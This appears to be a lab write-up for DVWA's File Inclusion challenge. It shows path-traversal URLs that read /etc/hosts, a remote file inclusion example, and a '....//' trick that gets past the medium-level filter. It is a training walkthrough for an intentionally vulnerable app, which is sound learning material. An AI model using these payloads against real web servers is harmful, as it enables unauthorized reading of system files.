# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Sources/low.php)


We can display any file from the system like that:

`/vulnerabilities/fi/?page=./../../../../../etc/hosts`

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Pictures/1.png)

Or even a site like:
`/vulnerabilities/fi/?page=https://www.google.com`



# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Sources/medium.php)

The php script will remove now  `../` and `.."`.

So we will try something like this:

`/vulnerabilities/fi/?page=./....//....//....//....//....//etc/hosts`

Now, removing `../` our url will be 
`/vulnerabilities/fi/?page=./../../../../../etc/hosts`

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Pictures/2.png)



# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Sources/high.php)

The php script will return now files like `file*` and `include.php`

This file is now available:
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Pictures/3.png)



# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Inclusion/Sources/impossible.php)
